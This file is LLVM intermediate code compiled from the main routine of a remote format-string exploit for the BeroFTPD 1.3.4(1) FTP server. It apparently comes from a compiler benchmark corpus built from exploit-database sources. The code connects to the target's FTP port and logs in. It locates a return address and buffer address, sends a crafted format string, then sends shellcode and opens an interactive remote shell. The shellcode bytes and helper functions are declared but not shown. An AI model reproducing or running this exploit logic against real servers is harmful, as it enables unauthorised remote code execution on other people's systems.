; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux_x86/remote/extr_269.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux_x86/remote/extr_269.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.TYPE_2__ = type { i8*, i64 }

@.str = private unnamed_addr constant [42 x i8] c"\0A  BeroFTPD 1.3.4(1) exploit by qitest1\0A\0A\00", align 1
@.str.1 = private unnamed_addr constant [7 x i8] c"h:t:o:\00", align 1
@EOF = common dso_local global i32 0, align 4
@optarg = common dso_local global i32 0, align 4
@sel = common dso_local global i64 0, align 8
@offset = common dso_local global i8* null, align 8
@.str.2 = private unnamed_addr constant [20 x i8] c"+Host: %s\0A  as: %s\0A\00", align 1
@target = common dso_local global %struct.TYPE_2__* null, align 8
@.str.3 = private unnamed_addr constant [22 x i8] c"+Connecting to %s...\0A\00", align 1
@sock = common dso_local global i32 0, align 4
@.str.4 = private unnamed_addr constant [13 x i8] c"  connected\0A\00", align 1
@.str.5 = private unnamed_addr constant [22 x i8] c"+Receiving banner...\0A\00", align 1
@.str.6 = private unnamed_addr constant [3 x i8] c"%s\00", align 1
@.str.7 = private unnamed_addr constant [12 x i8] c"  received\0A\00", align 1
@.str.8 = private unnamed_addr constant [16 x i8] c"+Logging in...\0A\00", align 1
@.str.9 = private unnamed_addr constant [13 x i8] c"  logged in\0A\00", align 1
@.str.10 = private unnamed_addr constant [22 x i8] c"+Searching retloc...\0A\00", align 1
@.str.11 = private unnamed_addr constant [13 x i8] c"  found: %p\0A\00", align 1
@retloc = common dso_local global i32 0, align 4
@.str.12 = private unnamed_addr constant [23 x i8] c"+Searching bufaddr...\0A\00", align 1
@tmpaddr = common dso_local global i64 0, align 8
@bufaddr = common dso_local global i64 0, align 8
@.str.13 = private unnamed_addr constant [24 x i8] c"  found: %p + offset = \00", align 1
@.str.14 = private unnamed_addr constant [4 x i8] c"%p\0A\00", align 1
@.str.15 = private unnamed_addr constant [25 x i8] c"+Preparing shellcode...\0A\00", align 1
@shellcode = common dso_local global i8* null, align 8
@shellcode_read = common dso_local global i8* null, align 8
@.str.16 = private unnamed_addr constant [19 x i8] c"  shellcode ready\0A\00", align 1
@.str.17 = private unnamed_addr constant [21 x i8] c"+Building fmtstr...\0A\00", align 1
@.str.18 = private unnamed_addr constant [18 x i8] c"  fmtstr builded\0A\00", align 1
@.str.19 = private unnamed_addr constant [20 x i8] c"+Sending fmtstr...\0A\00", align 1
@fmtstr = common dso_local global i8* null, align 8
@.str.20 = private unnamed_addr constant [15 x i8] c"  fmtstr sent\0A\00", align 1
@.str.21 = private unnamed_addr constant [24 x i8] c"+Entering love mode...\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca [1024 x i8], align 16
  %7 = alloca i8*, align 8
  %8 = alloca i32, align 4
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  store i8* null, i8** %7, align 8
  %9 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([42 x i8], [42 x i8]* @.str, i64 0, i64 0))
  %10 = load i32, i32* %4, align 4
  %11 = icmp eq i32 %10, 1
  br i1 %11, label %12, label %17

12:                                               ; preds = %2
  %13 = load i8**, i8*** %5, align 8
  %14 = getelementptr inbounds i8*, i8** %13, i64 0
  %15 = load i8*, i8** %14, align 8
  %16 = call i32 @usage(i8* %15)
  br label %17

17:                                               ; preds = %12, %2
  br label %18

18:                                               ; preds = %41, %17
  %19 = load i32, i32* %4, align 4
  %20 = load i8**, i8*** %5, align 8
  %21 = call i32 @getopt(i32 %19, i8** %20, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.1, i64 0, i64 0))
  store i32 %21, i32* %8, align 4
  %22 = load i32, i32* @EOF, align 4
  %23 = icmp ne i32 %21, %22
  br i1 %23, label %24, label %42

24:                                               ; preds = %18
  %25 = load i32, i32* %8, align 4
  switch i32 %25, label %36 [
    i32 104, label %26
    i32 116, label %29
    i32 111, label %33
  ]

26:                                               ; preds = %24
  %27 = load i32, i32* @optarg, align 4
  %28 = call i8* @strdup(i32 %27)
  store i8* %28, i8** %7, align 8
  br label %41

29:                                               ; preds = %24
  %30 = load i32, i32* @optarg, align 4
  %31 = call i8* @atoi(i32 %30)
  %32 = ptrtoint i8* %31 to i64
  store i64 %32, i64* @sel, align 8
  br label %41

33:                                               ; preds = %24
  %34 = load i32, i32* @optarg, align 4
  %35 = call i8* @atoi(i32 %34)
  store i8* %35, i8** @offset, align 8
  br label %41

36:                                               ; preds = %24
  %37 = load i8**, i8*** %5, align 8
  %38 = getelementptr inbounds i8*, i8** %37, i64 0
  %39 = load i8*, i8** %38, align 8
  %40 = call i32 @usage(i8* %39)
  br label %41

41:                                               ; preds = %36, %33, %29, %26
  br label %18

42:                                               ; preds = %18
  %43 = load i8*, i8** %7, align 8
  %44 = icmp eq i8* %43, null
  br i1 %44, label %45, label %50

45:                                               ; preds = %42
  %46 = load i8**, i8*** %5, align 8
  %47 = getelementptr inbounds i8*, i8** %46, i64 0
  %48 = load i8*, i8** %47, align 8
  %49 = call i32 @usage(i8* %48)
  br label %50

50:                                               ; preds = %45, %42
  %51 = load i8*, i8** %7, align 8
  %52 = load %struct.TYPE_2__*, %struct.TYPE_2__** @target, align 8
  %53 = load i64, i64* @sel, align 8
  %54 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %52, i64 %53
  %55 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %54, i32 0, i32 0
  %56 = load i8*, i8** %55, align 8
  %57 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str.2, i64 0, i64 0), i8* %51, i8* %56)
  %58 = load i8*, i8** %7, align 8
  %59 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str.3, i64 0, i64 0), i8* %58)
  %60 = load i8*, i8** %7, align 8
  %61 = call i32 @conn2host(i8* %60, i32 21)
  store i32 %61, i32* @sock, align 4
  %62 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.4, i64 0, i64 0))
  %63 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str.5, i64 0, i64 0))
  %64 = load i32, i32* @sock, align 4
  %65 = getelementptr inbounds [1024 x i8], [1024 x i8]* %6, i64 0, i64 0
  %66 = call i32 @recv(i32 %64, i8* %65, i32 1024, i32 0)
  %67 = getelementptr inbounds [1024 x i8], [1024 x i8]* %6, i64 0, i64 0
  %68 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.6, i64 0, i64 0), i8* %67)
  %69 = getelementptr inbounds [1024 x i8], [1024 x i8]* %6, i64 0, i64 0
  %70 = call i32 @memset(i8* %69, i32 0, i32 1024)
  %71 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.7, i64 0, i64 0))
  %72 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.8, i64 0, i64 0))
  %73 = call i32 (...) @login()
  %74 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.9, i64 0, i64 0))
  %75 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str.10, i64 0, i64 0))
  %76 = call i32 (...) @retloc_find()
  %77 = load i32, i32* @retloc, align 4
  %78 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.11, i64 0, i64 0), i32 %77)
  %79 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([23 x i8], [23 x i8]* @.str.12, i64 0, i64 0))
  %80 = load i64, i64* @tmpaddr, align 8
  %81 = load %struct.TYPE_2__*, %struct.TYPE_2__** @target, align 8
  %82 = load i64, i64* @sel, align 8
  %83 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %81, i64 %82
  %84 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %83, i32 0, i32 1
  %85 = load i64, i64* %84, align 8
  %86 = add nsw i64 %80, %85
  store i64 %86, i64* @bufaddr, align 8
  %87 = load i64, i64* @bufaddr, align 8
  %88 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.13, i64 0, i64 0), i64 %87)
  %89 = load i8*, i8** @offset, align 8
  %90 = load i64, i64* @bufaddr, align 8
  %91 = getelementptr i8, i8* %89, i64 %90
  %92 = ptrtoint i8* %91 to i64
  store i64 %92, i64* @bufaddr, align 8
  %93 = load i64, i64* @bufaddr, align 8
  %94 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.14, i64 0, i64 0), i64 %93)
  %95 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([25 x i8], [25 x i8]* @.str.15, i64 0, i64 0))
  %96 = load i8*, i8** @shellcode, align 8
  %97 = call i64 @strlen(i8* %96)
  %98 = trunc i64 %97 to i8
  %99 = load i8*, i8** @shellcode_read, align 8
  %100 = load i8*, i8** @shellcode_read, align 8
  %101 = call i64 @strlen(i8* %100)
  %102 = getelementptr inbounds i8, i8* %99, i64 %101
  store i8 %98, i8* %102, align 1
  %103 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str.16, i64 0, i64 0))
  %104 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.17, i64 0, i64 0))
  %105 = load i64, i64* @bufaddr, align 8
  %106 = load i32, i32* @retloc, align 4
  %107 = call i32 @fmtstr_build(i64 %105, i32 %106)
  %108 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str.18, i64 0, i64 0))
  %109 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str.19, i64 0, i64 0))
  %110 = load i32, i32* @sock, align 4
  %111 = load i8*, i8** @fmtstr, align 8
  %112 = load i8*, i8** @fmtstr, align 8
  %113 = call i64 @strlen(i8* %112)
  %114 = call i32 @send(i32 %110, i8* %111, i64 %113, i32 0)
  %115 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.20, i64 0, i64 0))
  %116 = load i32, i32* @sock, align 4
  %117 = getelementptr inbounds [1024 x i8], [1024 x i8]* %6, i64 0, i64 0
  %118 = call i32 @recv(i32 %116, i8* %117, i32 1024, i32 0)
  %119 = call i32 @sleep(i32 1)
  %120 = load i32, i32* @sock, align 4
  %121 = load i8*, i8** @shellcode, align 8
  %122 = load i8*, i8** @shellcode, align 8
  %123 = call i64 @strlen(i8* %122)
  %124 = call i32 @send(i32 %120, i8* %121, i64 %123, i32 0)
  %125 = call i32 @sleep(i32 2)
  %126 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.21, i64 0, i64 0))
  %127 = load i32, i32* @sock, align 4
  %128 = call i32 @shellami(i32 %127)
  %129 = load i32, i32* %3, align 4
  ret i32 %129
}

declare dso_local i32 @printf(i8*, ...) #1

declare dso_local i32 @usage(i8*) #1

declare dso_local i32 @getopt(i32, i8**, i8*) #1

declare dso_local i8* @strdup(i32) #1

declare dso_local i8* @atoi(i32) #1

declare dso_local i32 @conn2host(i8*, i32) #1

declare dso_local i32 @recv(i32, i8*, i32, i32) #1

declare dso_local i32 @memset(i8*, i32, i32) #1

declare dso_local i32 @login(...) #1

declare dso_local i32 @retloc_find(...) #1

declare dso_local i64 @strlen(i8*) #1

declare dso_local i32 @fmtstr_build(i64, i32) #1

declare dso_local i32 @send(i32, i8*, i64, i32) #1

declare dso_local i32 @sleep(i32) #1

declare dso_local i32 @shellami(i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
